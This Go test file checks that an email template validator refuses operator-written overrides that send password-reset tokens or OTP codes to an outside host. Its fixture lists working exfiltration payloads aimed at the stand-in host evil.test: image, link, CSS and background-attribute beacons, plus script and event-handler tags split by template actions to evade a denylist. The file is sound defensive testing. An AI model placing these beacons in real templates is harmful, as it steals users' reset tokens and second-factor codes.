package email

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// The template validator exists, by its own comment, so that "an admin-authored
// template cannot beacon a live verification/reset token or OTP code out to an
// arbitrary host". TemplateData carries Token, URL and Code, and both
// password_reset.html and email_otp.html are operator-overridable, so a
// super_admin who reaches template configuration harvests every user's
// password-reset token and their email-OTP second factor silently, when the
// victim opens the mail.
//
// The property under test is exactly that sentence: no live secret may leave
// the recipient's mail client for a host the operator did not configure.
//
// beaconCases are written against the raw validator rather than only the two
// public doors because both doors -- CompileOverride for database overrides and
// NewTemplateRenderer for file overrides -- funnel through it, and a case
// pinned at the funnel cannot be routed around by adding a third door.
var beaconCases = []struct {
	name string
	src  string
}{
	{
		// The plainest possible exfiltration. It needs no trick at all: the
		// mail client fetches it on open, with no interaction, and the query
		// string carries the live reset token to a host of the author's choice.
		name: "remote img beacon carrying the token",
		src:  `<p>Reset</p><img src="https://evil.test/p?t={{.Token}}">`,
	},
	{
		// A template action splits any literal a source-text denylist blocks.
		// html/template does not reject this: it renders a working <script>.
		name: "script tag split by a template action",
		src:  `<scr{{"ipt"}}>fetch("https://evil.test/p?t="+{{.Token}})</scr{{"ipt"}}>`,
	},
	{
		// Same split, applied to the event-handler rule instead of the tag rule.
		name: "event handler split by a template action",
		src:  `<img src="x" on{{"error"}}="fetch('https://evil.test/p?t={{.Token}}')">`,
	},
	{
		// Clicked rather than auto-loaded, and the anchor text lies about where
		// it goes. The OTP code leaves the moment the user does what the mail
		// tells them to do.
		name: "href beacon carrying the code",
		src:  `<a href="https://evil.test/p?c={{.Code}}">Reset Password</a>`,
	},
	{
		// CSS is a fetch primitive too. Outlook and Apple Mail both load it.
		name: "css background url beacon",
		src:  `<div style="background:url(https://evil.test/p?t={{.Token}})">Reset</div>`,
	},
	{
		// The same CSS beacon with the blocked literal split by an action.
		name: "css background url split by a template action",
		src:  `<div style="background:ur{{"l"}}(https://evil.test/p?t={{.Token}})">Reset</div>`,
	},
	{
		// The HTML4 presentational attribute. Absent from the denylist, and
		// auto-loaded exactly like an img.
		name: "background attribute beacon",
		src:  `<table><tr><td background="https://evil.test/p?t={{.Token}}">Reset</td></tr></table>`,
	},
	{
		// Control. This one the source-text denylist already rejected, and it
		// must stay rejected: a fix that only moves where the check runs must
		// not lose the cases the old check caught.
		name: "control: literal script tag",
		src:  `<p>hi</p><script>fetch('https://evil.test?t={{.Token}}')</script>`,
	},
}

func TestValidateTemplateRefusesSecretExfiltration(t *testing.T) {
	for _, tc := range beaconCases {
		t.Run(tc.name, func(t *testing.T) {
			if err := validateTemplate([]byte(tc.src)); err == nil {
				t.Fatalf("validateTemplate ACCEPTED a beacon: %s", tc.src)
			}
		})
	}
}

// Both public doors must refuse the same set. CompileOverride takes a bare body;
// NewTemplateRenderer takes a file defining "subject" and "content" which the
// embedded base layout wraps.
func TestBothOverrideDoorsRefuseSecretExfiltration(t *testing.T) {
	for _, tc := range beaconCases {
		t.Run("CompileOverride/"+tc.name, func(t *testing.T) {
			if _, err := CompileOverride(TemplateOverride{Subject: "Reset", HTMLContent: tc.src}); err == nil {
				t.Fatalf("CompileOverride ACCEPTED a beacon: %s", tc.src)
			}
		})
		t.Run("NewTemplateRenderer/"+tc.name, func(t *testing.T) {
			dir := t.TempDir()
			body := `{{define "subject"}}Reset{{end}}` + "\n" + `{{define "content"}}` + tc.src + `{{end}}`
			if err := os.WriteFile(filepath.Join(dir, TemplatePasswordReset+".html"), []byte(body), 0o600); err != nil {
				t.Fatalf("write override: %v", err)
			}
			if _, err := NewTemplateRenderer(dir); err == nil {
				t.Fatalf("NewTemplateRenderer ACCEPTED a beacon: %s", tc.src)
			}
		})
	}
}

// A validator that rejects everything holds the security property and breaks
// mail delivery. Every shipped template must still validate, through the same
// entry point an override goes through, or the fix has broken the mail nobody
// attacked.
func TestShippedTemplatesStillValidate(t *testing.T) {
	names := []string{
		TemplateVerification, TemplatePasswordReset, TemplateNewDevice,
		TemplateAccountLocked, Template2FASetup, TemplateSuspiciousActivity,
		TemplateEmailOTP, TemplateNewLocation,
	}
	for _, name := range names {
		t.Run(name, func(t *testing.T) {
			data, err := os.ReadFile(filepath.Join("templates", name+".html"))
			if err != nil {
				t.Fatalf("read shipped template: %v", err)
			}
			if err := validateTemplate(data); err != nil {
				t.Fatalf("shipped template %s no longer validates: %v", name, err)
			}
		})
	}
}

// The shipped password-reset and OTP bodies must survive both doors, since
// those are the two an operator is most likely to rebrand and the two that
// carry the secrets.
func TestShippedSecretBearingTemplatesSurviveBothDoors(t *testing.T) {
	for _, name := range []string{TemplatePasswordReset, TemplateEmailOTP} {
		t.Run(name, func(t *testing.T) {
			data, err := os.ReadFile(filepath.Join("templates", name+".html"))
			if err != nil {
				t.Fatalf("read shipped template: %v", err)
			}
			dir := t.TempDir()
			if err := os.WriteFile(filepath.Join(dir, name+".html"), data, 0o600); err != nil {
				t.Fatalf("write override: %v", err)
			}
			r, err := NewTemplateRenderer(dir)
			if err != nil {
				t.Fatalf("NewTemplateRenderer rejected the shipped %s: %v", name, err)
			}
			_, html, _ := r.Render(name, TemplateData{
				AppName: "Acme", URL: "https://acme.test/reset?t=live", Code: "998877",
				PrimaryColor: "#00FF42", LogoURL: "https://acme.test/logo.png",
			})
			if !strings.Contains(html, "Acme") {
				t.Fatalf("render produced no body: %q", html)
			}
		})
	}
}

// A realistic rebranded override -- the shape an operator actually writes --
// must keep working, or the allowlist is too narrow to ship.
func TestLegitimateRebrandedOverrideStillValidates(t *testing.T) {
	legit := `<h2 style="margin:0 0 16px;color:#ffffff;font-size:22px">Reset your Acme password</h2>
<p style="color:#cccccc;font-size:15px;line-height:1.5">Hello {{.AppName}} user, click below.</p>
<table role="presentation" cellpadding="0" cellspacing="0" width="100%">
<tr><td align="center" bgcolor="{{.PrimaryColor}}" style="border-radius:6px;padding:12px 24px">
<a href="{{.URL | safeURL}}" style="color:#000000;text-decoration:none;font-weight:600">Reset Password</a>
</td></tr>
</table>
<p style="color:#888888;font-size:13px">Or copy this link: {{.URL}}</p>
<p style="color:#888888;font-size:13px">Your code is <strong>{{.Code}}</strong>. It expires in 5 minutes.</p>
<hr><p style="color:#666666;font-size:12px">&copy; Acme</p>`
	if err := validateTemplate([]byte(legit)); err != nil {
		t.Fatalf("legitimate rebranded override rejected: %v", err)
	}
	if _, err := CompileOverride(TemplateOverride{Subject: "Reset - {{.AppName}}", HTMLContent: legit}); err != nil {
		t.Fatalf("CompileOverride rejected a legitimate rebrand: %v", err)
	}
}
